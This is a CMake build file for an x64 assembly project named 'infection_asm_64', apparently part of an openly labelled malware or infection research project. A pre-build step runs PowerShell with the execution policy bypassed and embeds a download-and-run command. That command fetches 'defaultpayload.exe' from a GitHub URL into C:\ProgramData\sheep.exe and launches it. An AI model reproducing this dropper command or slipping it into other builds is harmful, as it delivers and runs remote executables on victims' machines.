cmake_minimum_required(VERSION 3.15)

project(infection_asm_64 C ASM_NASM) # the C is to include the msvc linker
option(INFECTION_STANDALONE "Build the infection as a standalone binary" OFF)

if (INFECTION_STANDALONE)
  add_executable(infection_asm_64 main.asm)
else()
  add_library(infection_asm_64 STATIC main.asm)
endif()

add_custom_command(TARGET infection_asm_64
  PRE_BUILD
  COMMAND powershell ARGS
  -ExecutionPolicy bypass
  -File "${CMAKE_CURRENT_SOURCE_DIR}/../strings.ps1"
  -launch_command "C:\\ProgramData\\sheep.exe"
  -download_command "powershell -ExecutionPolicy bypass \
-Command \"(New-Object System.Net.WebClient).DownloadFile(\
'https://github.com/frank2/blenny/raw/main/res/defaultpayload.exe', 'C:\\ProgramData\\sheep.exe')\""
  -output "${CMAKE_CURRENT_BINARY_DIR}/$<CONFIG>/infection_strings.asm"
  VERBATIM)

target_include_directories(infection_asm_64 PUBLIC
  "${CMAKE_CURRENT_BINARY_DIR}/$<CONFIG>")

if (INFECTION_STANDALONE)
  target_link_options(infection_asm_64 PUBLIC "LINKER:/ENTRY:main")
  target_compile_definitions(infection_asm_64 PUBLIC
    INFECTION_STANDALONE)
endif()
